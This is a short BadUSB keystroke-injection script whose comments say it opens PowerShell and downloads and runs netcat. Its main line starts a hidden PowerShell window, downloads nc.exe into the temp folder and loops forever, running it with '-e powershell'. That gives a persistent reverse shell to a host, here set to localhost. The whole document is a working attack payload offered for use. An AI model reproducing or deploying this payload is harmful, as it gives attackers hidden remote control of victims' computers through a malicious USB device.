#this is the code that needs to be run by the BadUSB.
#it opens powershell, downloads and runs netcat

#https://community.idera.com/database-tools/powershell/ask_the_experts/f/learn_powershell_from_don_jones-24/22103/continuous-loop
#https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7.1

[GUI r]

#powershell -WindowStyle Hidden -c "$p = """$env:temp/nc.exe""";(New-Object System.Net.WebClient).DownloadFile("""http://localhost/""", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList """localhost""","""81""","""-e""","""powershell"""}"
powershell -WindowStyle Hidden -c "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://localhost/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \"localhost\",\"81\",\"-e\",\"powershell\"}"

[ENTER]

